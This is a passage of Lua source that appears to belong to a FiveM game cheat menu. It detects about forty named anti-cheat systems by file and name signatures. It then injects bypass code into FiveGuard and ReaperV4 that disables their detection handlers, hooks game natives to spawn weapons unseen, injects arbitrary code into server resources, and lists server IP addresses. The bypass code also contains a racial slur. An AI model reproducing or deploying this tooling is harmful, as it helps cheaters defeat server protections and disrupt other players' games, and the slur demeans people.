    if setKey == 'Control' or setKey == 'LeftControl' or setKey == 'RightControl' then
        ctrlHeld = true
        return
    end

    if setKey == 'Shift' or setKey == 'LeftShift' or setKey == 'RightShift' then
        shiftHeld = true
        return
    end

    local ctrl = ctrlHeld
    ctrlHeld = false
    local shift = shiftHeld

    if keybindActive then
        if setKey == 'Enter' then
            if keybindPending ~= '' then
                local captured = keybindPending
                local cb = keybindOnConfirm
                keybindActive = false
                settingItemKeybind = false
                keybindPending = ''
                keybindOnConfirm = nil
                keybindOnCancel = nil
                SendSvelte('hideInputPrompt', {})
                toggleNuiFocus(false)
                if cb then cb(captured) end
            end
        elseif setKey == 'Escape' then
            if keybindCanCancel then
                local cb = keybindOnCancel
                keybindActive = false
                settingItemKeybind = false
                keybindPending = ''
                keybindOnConfirm = nil
                keybindOnCancel = nil
                SendSvelte('hideInputPrompt', {})
                toggleNuiFocus(false)
            end
        elseif setKey ~= 'Shift' and setKey ~= 'Control' and setKey ~= 'Alt' and setKey ~= 'Tab' then
            keybindPending = setKey
            SendSvelte('updateInputPrompt', { title = keybindTitle, value = keyLabels[tonumber(key) or key] or setKey })
        end
        return
    end

    if inputActive then
        if setKey == 'Enter' then
            local val = inputBuffer
            inputActive = false
            setInputActive = false
            inputBuffer = ''
            SendSvelte('hideInputPrompt', {})
            if inputCallback then inputCallback(val) end
            toggleNuiFocus(false)
        elseif setKey == 'Escape' then
            inputActive = false
            setInputActive = false
            inputBuffer = ''
            inputCallback = nil
            SendSvelte('hideInputPrompt', {})
            toggleNuiFocus(false)
        elseif setKey == 'Backspace' then
            if #inputBuffer > 0 then
                inputBuffer = inputBuffer:sub(1, -2)
                SendSvelte('updateInputPrompt', { title = inputTitle, value = inputBuffer })
            end
        elseif ctrl and setKey == 'V' then
            local clip = MachoGetClipboardText()
            if clip and #clip > 0 then
                inputBuffer = inputBuffer .. clip
                SendSvelte('updateInputPrompt', { title = inputTitle, value = inputBuffer })
            end
        else
            local char = getInputChar(key, shift)
            if char then
                inputBuffer = inputBuffer .. char
                SendSvelte('updateInputPrompt', { title = inputTitle, value = inputBuffer })
            end
        end
        return
    end

    if setKey == MenuKey then
        toggleMenu(not menuOpen)
        return
    end

    local boundItem = itemKeybinds[setKey]
    if boundItem then
        createEnter(boundItem)
        return
    end

    if not menuOpen then return end

    local activeData = menuConfig[activeIndex]

    if key == 0x28 or key == 0x26 then 
        createActiveIndex(key == 0x28 and 1 or -1)
    elseif key == 0x27 or key == 0x25 then 
        createOptions(key == 0x27 and 'ArrowRight' or 'ArrowLeft', activeData)
    elseif key == 0x0D then 
        createEnter(activeData)
    elseif key == 0x08 then 
        createBackspace()
    elseif key == 0x51 then 
        createTabs('Q')
    elseif key == 0x45 then 
        createTabs('E')
    elseif key == 0x73 then
        if activeData and activeData.label then
            startItemKeybindCapture(activeData)
        end
    end
end)

MachoOnKeyUp(function(key)
    local setKey = KeyMap[tonumber(key) or key] or tostring(key)

    if setKey == 'Shift' or setKey == 'LeftShift' or setKey == 'RightShift' then
        shiftHeld = false
    end
end)

local setPlayers = {}
function getPlayers(coords, maxDistance)
    local nearby = {}
    local selfPed = PlayerId()
    local selfServerId = GetPlayerServerId(selfPed)

    nearby[#nearby + 1] = {
        name = GetPlayerName(selfPed) .. " (Self)",
        serverId = selfServerId
    }

    for _, serverId in ipairs(GetActivePlayers() or {}) do
        if serverId ~= selfPed then
            local ped = GetPlayerPed(serverId)
            if DoesEntityExist(ped) then
                local setCoords = GetEntityCoords(ped)

                if #(coords - setCoords) <= maxDistance then
                    nearby[#nearby + 1] = {
                        name = GetPlayerName(serverId),
                        serverId = GetPlayerServerId(serverId)
                    }
                end
            end
        end
    end

    return nearby
end

function getSpectators()
    local spectators = {}
    local selfId = PlayerId()
    local selfCoords = GetEntityCoords(PlayerPedId())

    if math.abs(selfCoords.x) <= 1.0 and math.abs(selfCoords.y) <= 1.0 then
        return spectators
    end

    for _, player in ipairs(GetActivePlayers() or {}) do
        if player ~= selfId then
            local ped = GetPlayerPed(player)

            if DoesEntityExist(ped) and not IsEntityVisible(ped) then
                local coords = GetEntityCoords(ped)
                local dx = math.abs(coords.x - selfCoords.x)
                local dy = math.abs(coords.y - selfCoords.y)
                local dz = selfCoords.z - coords.z

                if dx <= 15.0 and dy <= 15.0 and dz >= 10.0 then
                    spectators[#spectators + 1] = {
                        label = GetPlayerName(player) or '?',
                        value = tostring(GetPlayerServerId(player))
                    }
                end
            end
        end
    end

    return spectators
end

function getSelectedPlayers()
    local coords = GetEntityCoords(PlayerPedId())
    local players = getPlayers(coords, 350.0)
    for _, player in ipairs(players) do
        setPlayers[tonumber(player.serverId)] = true
    end
end

function GetSelectedPlayer()
    for k, v in pairs(setPlayers) do
        if v then return tonumber(k) end
    end
    return nil
end

local function TeleportToCoords(x, y, z)
    injectCode('monitor', ([[
        local function FindZForCoords(x, y)
            local found = true
            local START_Z = 1500
            local z = START_Z
            while found and z > 0 do
                local _found, _z = GetGroundZAndNormalFor_3dCoord(x + 0.0, y + 0.0, z - 1.0)
                if _found then
                    z = _z + 0.0
                end
                found = _found
                Wait(0)
            end
            if z == START_Z then return nil end
            return z + 0.0
        end

        local function FindZForCoordsRetry(x, y)
            local finalZ
            for i = 1, 10 do
                finalZ = FindZForCoords(x, y)
                if finalZ ~= nil and finalZ ~= 0.0 then
                    return finalZ
                end
                Wait(250)
            end
            return nil
        end

        local x, y, z = %f, %f, %f
        local function TeleportToCoords(x, y, z)
            local ped = PlayerPedId()
            DoScreenFadeOut(250)
            while not IsScreenFadedOut() do Wait(0) end
            SafeRunNative(SetPedCoordsKeepVehicle, ped, x, y, 100.0)
            while IsEntityWaitingForWorldCollision(ped) do Wait(100) end
            if z == 0 or z == 0.0 then
                local groundZ = FindZForCoordsRetry(x, y)
                if groundZ ~= nil then z = groundZ else z = 100.0 end
            end
            SafeRunNative(SetPedCoordsKeepVehicle, ped, x, y, z)
            DoScreenFadeIn(250)
        end

        TeleportToCoords(x, y, z)
    ]]):format(x, y, z))
end

local function Debug(...)
    local args = {...}
    for i, v in ipairs(args) do
        args[i] = tostring(v)
    end

    print('[^5Junkie^7] [^3Info^7] - '..table.concat(args, ' '))
end

local logServerEvents = false
local blockServerEvents = false
local serverEventHooked = false
local serverEventSeen = {}
local SERVER_EVENT_LOG_LIMIT = 3

local function installServerEventHook()
    if serverEventHooked then
        return true
    end

    if type(MachoAddTriggerServerEventCallback) ~= 'function' then
        showNotify('This build has no server event hook', 'error')
        return false
    end

    MachoAddTriggerServerEventCallback(function(event, data, size)
        if logServerEvents then
            local seen = (serverEventSeen[event] or 0) + 1
            serverEventSeen[event] = seen

            if seen <= SERVER_EVENT_LOG_LIMIT then
                Debug('Server Event:', event, 'size=' .. tostring(size), tostring(data))
            elseif seen == SERVER_EVENT_LOG_LIMIT + 1 then
                Debug('Server Event:', event, '- repeating, silenced')
            end
        end

        return blockServerEvents, false
    end)

    serverEventHooked = true
    return true
end

local function runTrigger(resource, code)
    if not code or code:gsub('%s', '') == '' then
        showNotify('Nothing to run', 'error')
        return
    end

    resource = (resource and resource ~= '') and resource or 'any'

    local chunk
    local func, args = nil, nil

    if not code:find('[\n;]') then
        func, args = code:match('^%s*([%w_%.:]+)%s*%((.*)%)%s*$')
    end

    if func then
        if args and args:gsub('%s', '') ~= '' then
            chunk = 'SafeRunNative(' .. func .. ', ' .. args .. ')'
        else
            chunk = 'SafeRunNative(' .. func .. ')'
        end
    else
        chunk = 'SafeRunNative(function()\n' .. code .. '\nend)'
    end

    injectCode(resource, chunk)

    showNotify('Ran trigger', 'success')
end

local function dumpResources()
    local total = GetNumResources() or 0
    local started = 0

    Debug('--- Resources (' .. tostring(total) .. ') ---')

    for i = 0, total - 1 do
        local name = GetResourceByFindIndex(i)

        if name and GetResourceState(name) == 'started' then
            started = started + 1
            Debug(name .. (MachoResourceInjectable(name) and ' [injectable]' or ''))
        end
    end

    showNotify(('Dumped %d started resources to F8'):format(started), 'info')
end

-- AC Detection
local function detectAntiCheat(verbose)
    local numResources = GetNumResources()
    local detectedName, detectedAc

    local fileSignatures = {
        { files = { 'ai_module_fg-obfuscated.lua' }, name = 'FiveGuard' },
        { files = { 'source/client/crasher.lua', 'source/client/ocr.lua' }, name = 'ReasonAC' },
        { files = { 'client/injections.lua', 'client/menu.lua' }, name = 'GreekAC' },
        { files = { 'fini_events.js', 'fini_events.lua' }, name = 'FiniAC' },
        { files = { 'resource/waveshield.js' }, name = 'WaveShield' },
        { files = { 'c_config.lua', 'client/ligma.lua' }, name = 'mAC (custom)' },
        { files = { 'src/fire-client.lua', 'src/fire-menu.lua' }, name = 'FireAC' },
        { files = { 'anvil.lua', 'client.lua' }, name = 'AnvilAC' },
        { files = { 'client/cl_crypto.lua', 'client/cl_main.lua' }, name = 'PegasusAC' },
        { files = { 'src/client/main.lua', 'src/include/client.lua' }, name = 'ElectronAC' }
    }

    local reaperFiles = {
        'patches/resource_drc_uwucafe.lua',
        'patches/resource_es_extended.lua',
        'patches/resource_lb-phone.lua',
        'patches/resource_monitor.lua',
        'patches/resource_pickle_rental.lua',
        'patches/resource_qb-core.lua',
        'patches/resource_wasabi_bridge.lua',
        'patches/resource_wasabi_mining.lua',
        'patches/resource_xradio.lua'
    }

    local namePatterns = {
        { match = function(lower) return lower:sub(1,7) == 'chubsac' end, name = 'Chubs AC' },
        { match = function(lower) return lower:sub(1,7) == 'drillac' end, name = 'Drill AC' },
        { match = function(lower) return lower:sub(-10) == 'likizao_ac' end, name = 'Likizao AC' },
        { match = function(lower) return lower == 'prp-rpc' end, name = 'Prodigy AC' },
        { match = function(lower) return lower == 'srp-anticheat' end, name = 'Springbank AC' },
        { match = function(lower) return lower == 'ec_ac' end, name = 'Eagle AC' },
        { match = function(lower) return lower == 'cyberanticheat' end, name = 'CyberAnticheat' },
        { match = function(lower) return lower == 'pl_protect' end, name = 'PL Protect' },
        { match = function(lower) return lower == 'mqcu' end, name = 'MQCU' },
        { match = function(lower) return lower == 'thnac' end, name = 'Thn AC' },
        { match = function(lower) return lower == 'qb-anticheat' end, name = 'QB AntiCheat' },
        { match = function(lower) return lower == 'nb_anticheat' end, name = 'NB AntiCheat' },
        { match = function(lower) return lower == 'putin' end, name = 'Putin AC' },
        { match = function(lower) return lower == 'venus_anticheat' or lower == 'venusac' end, name = 'Venus AC' },
        { match = function(lower) return lower == 'anticheese' or lower == 'anticheese-anticheat' end, name = 'AntiCheese' },
        { match = function(lower) return lower == 'anticheese-anticheat-master' or lower == 'anticheese-master' end, name = 'AntiCheese Master' },
        { match = function(lower) return lower == 'wx-anticheat' end, name = 'WX AntiCheat' },
        { match = function(lower) return lower == 'wx_anticheat' end, name = 'WX AntiCheat' },
        { match = function(lower) return lower == 'somis_anticheat' or lower == 'somis-anticheat' end, name = 'Somis AntiCheat' },
        { match = function(lower) return lower == 'clownguard' end, name = 'ClownGuard' },
        { match = function(lower) return lower == 'oltest' end, name = 'OLTest' },
        { match = function(lower) return lower == 'chocohax' end, name = 'ChocoHax' },
        { match = function(lower) return lower == 'esxac' end, name = 'ESX AC' },
        { match = function(lower) return lower == 'tigoac' end, name = 'Tigo AC' },
        { match = function(lower) return lower == 'tiagoac' end, name = 'Tiago AC' },
        { match = function(lower) return lower == 'titanac' end, name = 'Titan AC' },
        { match = function(lower) return lower == 'versusac' or lower == 'versusac-ocr' end, name = 'Versus AC' },
        { match = function(lower) return lower == 'furiousanticheat' end, name = 'Furious AC' },
        { match = function(lower) return lower == 'mzshieldd' end, name = 'MZShield' },
        { match = function(lower) return lower:find('kb-anticheat') end, name = 'KB AntiCheat' },
        { match = function(lower) return lower:find('pma-anticheat') end, name = 'PMA AntiCheat' },
        { match = function(lower) return lower:find('drizzy') end, name = 'Drizzy AC' }
    }

    for i = 0, numResources - 1 do
        local resourceName = GetResourceByFindIndex(i)

        if not resourceName then goto continue end

        local lower = string.lower(resourceName)

        for _, sig in ipairs(fileSignatures) do
            local ok = true
            for _, f in ipairs(sig.files) do
                if not LoadResourceFile(resourceName, f) then ok = false break end
            end
            if ok then
                detectedName, detectedAc = resourceName, sig.name
                break
            end
        end

        if detectedAc then break end

        for _, f in ipairs(reaperFiles) do
            if LoadResourceFile(resourceName, f) then
                local isPro = GetConvar('reaper_pro_addon_enabled', 'false') == 'true'
                detectedName = resourceName
                detectedAc = isPro and 'ReaperV4 Pro' or 'ReaperV4'
                break
            end
        end

        if detectedAc then break end
        
        local hasPamLua  = LoadResourceFile(resourceName, 'pam.obf.lua') or LoadResourceFile(resourceName, 'dist/pam.obf.lua')
        local hasPamJS   = LoadResourceFile(resourceName, 'pam.obf.js')  or LoadResourceFile(resourceName, 'dist/pam.obf.js')
        local hasPamHTML = LoadResourceFile(resourceName, 'dist/pam.html')

        if (hasPamLua and hasPamJS) or (hasPamLua and hasPamHTML) then
            detectedName, detectedAc = resourceName, 'PhoenixAC'
            break
        end

        for _, pat in ipairs(namePatterns) do
            local ok, res = pcall(pat.match, lower)
            if ok and res then
                detectedName, detectedAc = resourceName, pat.name
                break
            end
        end

        if detectedAc then break end

        ::continue::
    end

    return detectedName, detectedAc
end

local ServerInfo = {
    endpoint = nil,
    ip = nil,
    port = nil,
    name = nil,
    cached = false
}

local function parseServerEndpoint()
    local endpoint = GetCurrentServerEndpoint()
    if not endpoint or endpoint == '' then
        return nil, nil, endpoint or 'unknown'
    end
    
    local ip, port = endpoint:match('([^:]+):(%d+)')
    return ip, port, endpoint
end

local function initializeServerInfo()
    if ServerInfo.cached then
        return ServerInfo
    end

    local ip, port, endpoint = parseServerEndpoint()

    ServerInfo.endpoint = endpoint
    ServerInfo.ip = ip or 'unknown'
    ServerInfo.port = port or '0'
    ServerInfo.name = endpoint
    ServerInfo.cached = true

    return ServerInfo
end

initializeServerInfo()

-- Scan For AC
local name, ac = detectAntiCheat(false)

if ac then
    Debug('Detected Anti-Cheat:', ac, 'in resource', name)
    showNotify(('Detected Anti-Cheat: %s (Resource: %s)'):format(ac, name), 'info')
    if ac == 'FiveGuard' then
        MachoInjectResource2(3, name, [[ 
                pcall(function()
                local _, w = debug.getupvalue(EnableAllControlActions, 1)
                local _, M = debug.getupvalue(w[17], 1)
                local _, env = debug.getupvalue(M.h, 1)
                if env then env = nil end

                local function getEventHandlers()
                    local i = 1
                    while true do
                        local name, val = debug.getupvalue(AddEventHandler, i)
                        if not name then break end
                        if name == "eventHandlers" and type(val) == "table" then
                            return val
                        end
                        i = i + 1
                    end
                end

                local seen = {}
                local function scan(t)
                    if type(t) ~= "table" or seen[t] then return end
                    seen[t] = true
                    for k,v in pairs(t) do
                        if type(v) == "string" and v == "67314B49663351436761505579774D46654163554539436B4D7761326F575A49" then
                            t[k] = nil
                        elseif type(v) == "table" then
                            scan(v)
                        end
                    end
                end

                local i = 1
                while true do
                    local _, v = debug.getupvalue(AddEventHandler, i)
                    if not v then break end
                    if type(v) == "table" then scan(v) end
                    i = i + 1
                end

                local eventHandlers = getEventHandlers()
                if type(eventHandlers) == "table" then
                    local targets = {
                        ["CEventGunShot"]="Spoofed Bullet Ban Bypassed #1",["CEventGunShotBulletImpact"]="Spoofed Bullet Ban Bypassed #2",
                        ["gameEventTriggered"]="Client Manipulate Ban Bypassed",["jjspob"]="Unknown",["CEventExplosion"]="Explosion Detect Bypassed",
                        ["CEventExplosionHeard"]="Explosion Heard Bypassed",["CEventShockingExplosion"]="Shocking Explosion Bypassed",
                        ["CEventShockingGunshotFired"]="Gunshot Fired Bypassed",["CEventShockingGunshotHitPed"]="Gunshot Hit Ped Bypassed",
                        ["CEventShockingGunshotHitBuilding"]="Gunshot Hit Building Bypassed",["CEventShockingHelicopterOverhead"]="Helicopter Overhead Bypassed",
                        ["CEventShockingCarCrash"]="Car Crash Bypassed",["CEventShockingDrivingOnPavement"]="Driving On Pavement Bypassed",
                        ["CEventShockingBicycleOnPavement"]="Bicycle On Pavement Bypassed",["CEventShockingMadDriver"]="Mad Driver Bypassed",
                        ["CEventShockingPoliceInvestigating"]="Police Investigation Bypassed",["CEventShockingVisibleWeapon"]="Visible Weapon Bypassed",
                        ["CEventShockingVisibleWeaponThreat"]="Weapon Threat Bypassed",["CEventShockingDeadBody"]="Dead Body Bypassed",
                        ["CEventShockingDangerousAnimal"]="Dangerous Animal Bypassed",["CEventShockingEngineRevved"]="Engine Rev Bypassed",
                        ["CEventShockingHornSounded"]="Horn Sound Bypassed",["CEventShockingInDangerousVehicle"]="Dangerous Vehicle Bypassed",
                        ["CEventShockingNiceCar"]="Nice Car Bypassed",["CEventShockingPedKnockedIntoByPlayer"]="Ped Knocked Bypassed",
                        ["CEventShockingPotentialBlast"]="Potential Blast Bypassed",["CEventShockingPropertyDamage"]="Property Damage Bypassed",
                        ["CEventShockingRunningPed"]="Running Ped Bypassed",["CEventShockingSirens"]="Sirens Bypassed",
                        ["CEventShockingStudioBomb"]="Studio Bomb Bypassed",["CEventShockingVehicleTowed"]="Vehicle Towed Bypassed",
                        ["CEventVehicleCollision"]="Vehicle Collision Bypassed",["CEventVehicleDamage"]="Vehicle Damage Bypassed",
                        ["CEventVehicleOnFire"]="Vehicle Fire Bypassed",["CEventVehicleCreated"]="Vehicle Spawn Bypassed",
                        ["CEventVehicleUndriveable"]="Vehicle Undriveable Bypassed",["CEventPedCollisionWithPed"]="Ped Collision Bypassed",
                        ["CEventPedCollisionWithPlayer"]="Player Collision Bypassed",["CEventPedEnteredMyVehicle"]="Vehicle Enter Bypassed",
                        ["CEventPedJackingMyVehicle"]="Vehicle Jack Bypassed",["CEventPedOnCarRoof"]="Car Roof Bypassed",
                        ["CEventPedToChase"]="Ped Chase Bypassed",["CEventPlayerCollisionWithPed"]="Player Ped Collision Bypassed",
                        ["CEventPlayerDeath"]="Player Death Bypassed",["CEventPlayerUnableToEnterVehicle"]="Vehicle Enter Fail Bypassed",
                        ["CEventPlayerSpawned"]="Spawn Detect Bypassed",["CEventNetworkPlayerEnteredVehicle"]="Network Enter Vehicle Bypassed",
                        ["CEventNetworkPlayerLeftVehicle"]="Network Leave Vehicle Bypassed",["CEventNetworkEntityDamage"]="Network Damage Bypassed",
                        ["CEventNetworkHostMigration"]="Host Migration Bypassed",["CEventNetworkCheatTriggered"]="Cheat Trigger Bypassed",
                        ["CEventEntityDestroyed"]="Entity Destroy Bypassed",["CEventEntityDamaged"]="Entity Damage Bypassed",
                        ["CEventObjectCollision"]="Object Collision Bypassed",["CEventFireNearby"]="Nearby Fire Bypassed",
                        ["CEventCrimeReported"]="Crime Report Bypassed",["CEventDisturbance"]="Disturbance Bypassed",
                        ["CEventDraggedOutCar"]="Dragged Out Car Bypassed",["CEventLeaderEnteredCarAsDriver"]="Leader Enter Driver Bypassed",
                        ["CEventLeaderExitedCarAsDriver"]="Leader Exit Driver Bypassed",["CEventAcquaintancePedDead"]="Ped Dead Bypassed",
                        ["CEventAcquaintancePedHate"]="Ped Hate Bypassed",["CEventAcquaintancePedLike"]="Ped Like Bypassed",
                        ["CEventAcquaintancePedWanted"]="Ped Wanted Bypassed",["CEventDataDecisionMaker"]="Decision Maker Bypassed",
                        ["CEventHelpAmbientFriend"]="Ambient Friend Bypassed",["CEventPotentialWalkIntoFire"]="Walk Into Fire Bypassed",
                        ["CEventPotentialBlast"]="Potential Blast Bypassed",["CEventRanOverPed"]="Ran Over Ped Bypassed",
                        ["CEventSeenCop"]="Seen Cop Bypassed",["CEventFootStepHeard"]="Footstep Heard Bypassed",
                        ["CEventHurtTransition"]="Hurt Transition Bypassed",["CEventMeleeAction"]="Melee Action Bypassed",
                        ["CEventMeleeHit"]="Melee Hit Bypassed",["CEventDamage"]="Damage Event Bypassed",
                        ["CEventDeath"]="Death Event Bypassed",["CEventRevived"]="Revive Event Bypassed",
                        ["CEventScriptCommand"]="Script Command Bypassed",["CEventOpenDoor"]="Door Open Bypassed",
                        ["CEventCloseDoor"]="Door Close Bypassed",["CEventClimbLadderOnRoute"]="Ladder Route Bypassed",
                        ["CEventStatValueChanged"]="Stat Change Bypassed"
                    }

                    for eventName in pairs(targets) do
                        local raw = eventHandlers[eventName]
                        if raw then
                            if raw.handlers then
                                for id, fn in pairs(raw.handlers) do
                                    if type(fn) == "function" then
                                        raw.handlers[id] = function() end
                                    end
                                end
                            else
                                for id, fn in pairs(raw) do
                                    if type(fn) == "function" then
                                        raw[id] = function() end
                                    end
                                end
                            end
                        end
                    end
                end

                local seen = {}
                local depth = 0

                local function get_value_str(v)
                    if v == nil then return "nil" end
                    if type(v) == "string" then
                        return '"' .. v:sub(1,80):gsub("\n","\\n") .. (#v>80 and "..." or "") .. '"'
                    elseif type(v) == "function" then
                        local info = debug.getinfo(v, "Sln") or {}
                        return string.format("func(%s:%d)", info.short_src or "?", info.linedefined or 0)
                    elseif type(v) == "table" then
                        return tostring(v) .. " [#" .. (#v or "?") .. "]"
                    end
                    return tostring(v)
                end

                local function unlockScan(t, path)
                    if type(t) ~= "table" or seen[t] or depth > 12 then return end
                    seen[t] = true
                    depth = depth + 1

                    for k, v in pairs(t) do
                        if type(k) == "string" then
                            local changed = false
                            local before = v

                            if (k:sub(-6) == "Nigger" or k:find("bypass") or k:find("Bypass")) and v ~= true then
                                t[k] = true
                                changed = true
                            end
                        end

                        if type(v) == "table" then
                            unlockScan(v, path .. "." .. (type(k)=="string" and k or "["..tostring(k).."]"))
                        elseif type(v) == "function" then
                            local j = 1
                            while true do
                                local un, uv = debug.getupvalue(v, j)
                                if not un then break end
                                if type(uv) == "table" then
                                    unlockScan(uv, path .. "." .. k .. " " .. un)
                                end
                                j = j + 1
                            end
                        end
                    end

                    depth = depth - 1
                end

                i = 1
                while true do
                    local name, value = debug.getupvalue(AddEventHandler, i)
                    if not name then break end

                    if type(value) == "table" then
                        unlockScan(value, "up["..i.."]("..name..")")
                    elseif type(value) == "function" then
                        local j = 1
                        while true do
                            local un, uv = debug.getupvalue(value, j)
                            if not un then break end
                            if type(uv) == "table" then
                                unlockScan(uv, "up["..i.."]("..name..") "..un)
                            end
                            j = j + 1
                        end
                    end
                    i = i + 1
                end
            end)
        ]])
    elseif ac == 'ReaperV4' or ac == 'ReaperV4 Pro' then
        MachoInjectResourceRaw('ReaperV4', [[
            local _D = Detections or Detections_Self
            if _D then
                _D.detection = function()
                    return { key = "" }
                end
            end
        ]])
    end
else
    Debug('No known Anti-Cheat detected.')
    showNotify('No known Anti-Cheat detected in any resources.', 'info')
end

local function spawnWeaponByName(name, amount)
    if MachoResourceInjectable('ox_inventory') then
        injectCode('ox_inventory', '_G.RemoveAllPedWeapons = function() end')
    end

    if MachoResourceInjectable('ReaperV4') then
        local setWeapon = GetHashKey(name)
        local hooked = false

        MachoHookNative(0x0A6DB4965674D243, function(...)
            if GetCurrentResourceName() ~= 'ReaperV4' then return true end
            hooked = true
            return false, setWeapon
        end)

        MachoHookNative(0x8483E98E8B888AE2, function(...)
            if GetCurrentResourceName() ~= 'ReaperV4' then return true end
            hooked = true
            return false, setWeapon
        end)

        MachoHookNative(0x3A87E44BB9A01D54, function(...)
            if GetCurrentResourceName() ~= 'ReaperV4' then return true end
            hooked = true
            return false, false, setWeapon
        end)

        MachoHookNative(0x8DECB02F88F428BC, function(...)
            if GetCurrentResourceName() ~= 'ReaperV4' then return true end
            hooked = true
            return false, false
        end)

        CreateThread(function()
            local timer = GetGameTimer()
            while not hooked and (GetGameTimer() - timer) < 5000 do
                Wait(0)
            end
            GiveWeaponToPed(PlayerPedId(), setWeapon, amount or 250, false, true)
            SetPedAmmo(PlayerPedId(), setWeapon, amount or 250)
        end)
    else
        local weaponHash = GetHashKey(name)
        GiveWeaponToPed(PlayerPedId(), weaponHash, amount or 250, false, true)
    end
end

local function spawnCustomVehicle(setModel)
    if MachoResourceInjectable('hex-game') then
        injectCode('hex-game', string.format([[
            _G.Config.EnableGodmode = false
            _G.Config.Vehicle = '%s'

            local entit = SafeRunNative(TriggerEvent, 'hex-game:teleportPlayers', GetEntityCoords(PlayerPedId()))

            _G.SetVehicleDoorsLocked = function(...)
                if entit then return end
                return SetVehicleDoorsLocked(...)
            end
            _G.FreezeEntityPosition = function(...)
                if entit then return end
                return FreezeEntityPosition(...)
            end
            _G.SetVehicleCanBeTargetted = function(...)
                if entit then return end
                return SetVehicleCanBeTargetted(...)
            end
            _G.SetEntityInvincible = function(...)
                if entit then return end
                return SetEntityInvincible(...)
            end
            _G.DisableControlAction = function(...) local args = {...} if args[1] == 0 and args[2] == 75 then return end return DisableControlAction(...) end
        ]], setModel))
    elseif MachoResourceInjectable('WaveShield') then
        injectCode('monitor', string.format([[
            local setModel = GetHashKey('%s')
            local setPed = PlayerPedId()
            local selfCoords = GetEntityCoords(setPed)

            RequestModel(setModel)
            while not HasModelLoaded(setModel) do
                Wait(0)
            end

            SafeRunNative(CreateVehicle, setModel, selfCoords, 0.0, true, false)
        ]], setModel))
    else
        injectCode('monitor', string.format([[
            local setModel = GetHashKey('%s')
            local setPed = PlayerPedId()
            local selfCoords = GetEntityCoords(setPed)

            RequestModel(setModel)
            while not HasModelLoaded(setModel) do
                Wait(0)
            end

            SafeRunNative(CreateVehicle, setModel, selfCoords, 0.0, true, false)
        ]], setModel))
    end
end

local setClasses = {
    [0]  = { label = 'Compacts', models = {} },
    [1]  = { label = 'Sedans', models = {} },
    [2]  = { label = 'SUVs', models = {} },
    [3]  = { label = 'Coupes', models = {} },
    [4]  = { label = 'Muscle', models = {} },
    [5]  = { label = 'Sports Classics', models = {} },
    [6]  = { label = 'Sports', models = {} },
    [7]  = { label = 'Super', models = {} },
    [8]  = { label = 'Motorcycles', models = {} },
    [9]  = { label = 'Off-road', models = {} },
    [10] = { label = 'Industrial', models = {} },
    [11] = { label = 'Utility', models = {} },
    [12] = { label = 'Vans', models = {} },
    [13] = { label = 'Cycles', models = {} },
    [14] = { label = 'Boats', models = {} },
    [15] = { label = 'Helicopters', models = {} },
    [16] = { label = 'Planes', models = {} },
    [17] = { label = 'Service', models = {} },
    [18] = { label = 'Emergency', models = {} },
    [19] = { label = 'Military', models = {} },
    [20] = { label = 'Commercial', models = {} },
    [21] = { label = 'Trains', models = {} },
    [22] = { label = 'Open Wheel', models = {} },
}

do
    local gameModels = GetAllVehicleModels() or {}
    for i = 1, #gameModels do
        local model = gameModels[i]
        local setClass = GetVehicleClassFromName(model)
        if setClass and setClasses[setClass] then
            local t = setClasses[setClass].models
            t[#t + 1] = model
        end
    end
end

local vehicleClassScrollItems = {}
vehicleClassScrollItems[#vehicleClassScrollItems + 1] = {
    label = 'Custom Model',
    type = 'button',
    onConfirm = function(model)
        showInput("Enter Vehicle Model", "", function(model)
            if model and model ~= "" then
                spawnCustomVehicle(model)
            end
        end)
    end
}
vehicleClassScrollItems[#vehicleClassScrollItems + 1] = {
    label = 'All Models',
    type = 'divider',
}
for i = 0, 22 do
    if setClasses[i] and #setClasses[i].models > 0 then
        local models = setClasses[i].models
        local options = {}
        for j = 1, #models do
            options[j] = { label = models[j], value = models[j] }
        end
        vehicleClassScrollItems[#vehicleClassScrollItems + 1] = {
            label = setClasses[i].label,
            type = 'scroll',
            selected = 1,
            options = options,
            onConfirm = function(state)
                if state and state.value and state.value ~= "" then
                    spawnCustomVehicle(state.value)
                end
            end
        }
    end
end

local onlineListSubmenu = {
    {
        type = 'button',
        label = 'Select All Players',
        icon = 'ph-check-square',
        onConfirm = function()
            getSelectedPlayers()
        end
    },
    {
        type = 'button',
        label = 'Unselect All Players',
        icon = 'ph-square',
        onConfirm = function()
            setPlayers = {}
        end
    },
    { type = 'divider', label = 'Render Players' },
}

local SPAWN_KNOWN_ENDPOINTS = {
    ['135.148.129.55:30120'] = true,
    ['191.96.152.90:30120'] = true,
    ['206.168.173.19:3031'] = true,
    ['162.222.16.70:30120'] = true,
    ['178.239.199.58:30120'] = true,
    ['212.192.29.119:30130'] = true,
    ['91.190.154.39:30120'] = true,
    ['143.20.58.37:30120'] = true,
    ['191.96.152.17:30120'] = true,
    ['191.96.152.209:30120'] = true,
    ['128.254.184.92:30120'] = true,
    ['91.212.19.6:30120'] = true,
    ['23.26.135.40:30120'] = true,
    ['45.144.225.52:30120'] = true,
    ['23.26.121.215:30120'] = true,
    ['191.96.152.82:30120'] = true,
    ['141.11.104.28:30120'] = true,
    ['143.20.58.53:30120'] = true,
    ['91.212.19.130:30120'] = true,
    ['91.212.19.9:30120'] = true,
    ['91.190.154.176:30120'] = true,
    ['216.146.24.208:30120'] = true,
    ['23.26.121.19:30120'] = true,
    ['91.190.154.176:30120'] = true,
    ['216.146.24.52:30120'] = true,
    ['185.244.106.32:30120'] = true,
    ['141.11.104.101:30120'] = true,
    ['191.96.152.82:30120'] = true,
    ['141.140.31.79:30120'] = true,
    ['137.175.60.24:30120'] = true,
    ['162.222.16.4:30120'] = true,
    ['137.175.60.24:30120'] = true,
    ['191.96.152.27:30120'] = true,
    ['162.222.16.100:30120'] = true,
    ['191.96.152.12:30120'] = true,
    ['191.96.152.15:30120'] = true,
    ['91.212.19.10:30120'] = true,
    ['96.126.188.16:30120'] = true,
    ['162.222.16.216:30120'] = true,
    ['185.244.106.68:30120'] = true,
    ['216.146.24.124:30120'] = true,
    ['141.11.104.34:30120'] = true,
    ['128.254.184.25:30120'] = true,
    ['216.146.24.178:30120'] = true,
    ['147.189.168.247:30120'] = true,
    ['137.175.60.67:30120'] = true,
    ['185.244.106.41:30120'] = true,
    ['23.26.121.55:30120'] = true,
    ['23.26.121.156:30120'] = true,
    ['191.96.152.145:30120'] = true,
    ['141.11.104.43:30120'] = true,
    ['162.222.16.245:30120'] = true,
    ['207.180.26.2:30120'] = true,
    ['162.222.16.22:30120'] = true,
    ['162.222.16.52:30120'] = true,
    ['141.11.104.82:30120'] = true,
